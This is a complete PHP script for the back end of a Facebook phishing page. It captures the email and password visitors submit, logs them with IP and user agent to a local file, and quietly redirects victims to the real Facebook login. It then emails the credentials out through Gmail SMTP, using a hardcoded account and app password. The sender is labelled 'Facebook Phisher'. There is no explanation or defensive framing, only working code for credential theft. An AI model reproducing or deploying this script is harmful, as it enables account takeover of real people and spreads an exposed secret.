<?php
// Set error logging for debugging (will write to PHP error log, often /var/log/apache2/error.log or similar)
ini_set('display_errors', 0); // Hide errors from being displayed on the page
ini_set('log_errors', 1);     // Log errors to the PHP error log
ini_set('error_log', __DIR__ . '/php_errors.log'); // Custom error log file within our directory

// Include PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP; // Needed for SMTP constant

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

// Define the file to log credentials locally
$log_file = 'log.txt';

// Define the Gmail account details for sending the captured credentials
$gmail_username = 'mwananchihuslerloans@gmail.com'; // DCI's Gmail account for receiving
$gmail_app_password = 'hbqwzebzeosetler'; // DCI's App Password for this Gmail account

// Define the URL to redirect to after capture (real Facebook login page)
$redirect_url = 'https://www.facebook.com/login/';

// Ensure this script is only processed if data was POSTed
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: " . $redirect_url);
    exit();
}

// Get the submitted email and password
$email = isset($_POST['email']) ? $_POST['email'] : 'N/A';
$password = isset($_POST['password']) ? $_POST['password'] : 'N/A';

// Get other useful data for the log
$current_time = date("Y-m-d H:i:s");
$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A'; // Get browser/OS info

// Format the data to be logged locally
$log_data = "Time: " . $current_time . "\n";
$log_data .= "User IP: " . $user_ip . "\n";
$log_data .= "User Agent: " . $user_agent . "\n";
$log_data .= "Email/Phone: " . $email . "\n";
$log_data .= "Password: " . $password . "\n";
$log_data .= "--------------------------------------\n";

// --- Step 1: Log credentials to file (immediate) ---
if (file_put_contents($log_file, $log_data, FILE_APPEND | LOCK_EX) === false) {
    error_log("Failed to write to log file: " . $log_file);
}

// --- Step 2: Immediately redirect the user to the real Facebook page ---
// This is done before the email sending attempt to ensure quick response to the user.
header("Location: " . $redirect_url);
// Crucial: Use fastcgi_finish_request() if using PHP-FPM for true background processing after header
// However, for PHP's built-in server, exit() after header is the best we can do.
// The email sending will attempt immediately after the header is sent.
flush(); // Attempt to flush output buffer to client
session_write_close(); // Close any session if open, to release locks

// --- Step 3: Attempt to send email using PHPMailer (happens after redirect initiated) ---
$mail = new PHPMailer(true); // Passing true enables exceptions

try {
    // Server settings
    $mail->SMTPDebug = SMTP::DEBUG_OFF;                      // Enable verbose debug output (0 = off, 2 = client, 3 = client and server)
    $mail->isSMTP();                                         // Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                 // Enable SMTP authentication
    $mail->Username   = $gmail_username;                      // SMTP username (your Gmail address)
    $mail->Password   = $gmail_app_password;                  // SMTP password (your Gmail App Password)
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;          // Enable implicit TLS encryption
    $mail->Port       = 465;                                  // TCP port to connect to; use 587 if you set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    // Recipients
    $mail->setFrom($gmail_username, 'Facebook Phisher'); // Sender
    $mail->addAddress($gmail_username);                   // Add a recipient (sending to yourself)
    $mail->addReplyTo($gmail_username, 'Information');

    // Content
    $mail->isHTML(false); // Set email format to plain text
    $mail->Subject = 'Facebook Creds - ' . $current_time;
    $mail->Body    = $log_data; // Send the same detailed log data in the email

    $mail->send();
    // error_log("Email successfully sent to: " . $gmail_username); // For debugging
} catch (Exception $e) {
    error_log("Email could not be sent. Mailer Error: {$mail->ErrorInfo}");
    // You might also log $e->getMessage() for more detailed exceptions
}

exit(); // Ensure the script terminates
?>
